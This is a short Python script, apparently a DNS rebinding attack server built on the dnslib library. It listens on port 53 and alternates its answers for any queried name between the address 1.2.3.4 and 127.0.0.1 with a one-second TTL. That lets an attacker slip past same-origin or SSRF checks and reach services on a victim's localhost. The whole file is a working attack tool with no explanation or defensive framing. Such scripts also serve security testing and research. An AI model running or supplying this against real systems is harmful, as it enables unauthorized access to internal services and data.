from dnslib import * 
 from dnslib.server import DNSServer, BaseResolver 

 class RebindResolver(BaseResolver): 
     def __init__(self): 
         self.count = 0 

     def resolve(self, request, handler): 
         self.count += 1 
         reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q) 
         if self.count % 2 == 1: 
             reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A("1.2.3.4"), ttl=1)) 
         else: 
             reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A("127.0.0.1"), ttl=1)) 
         return reply 

 server = DNSServer(RebindResolver(), port=53, address="0.0.0.0") 
 server.start()

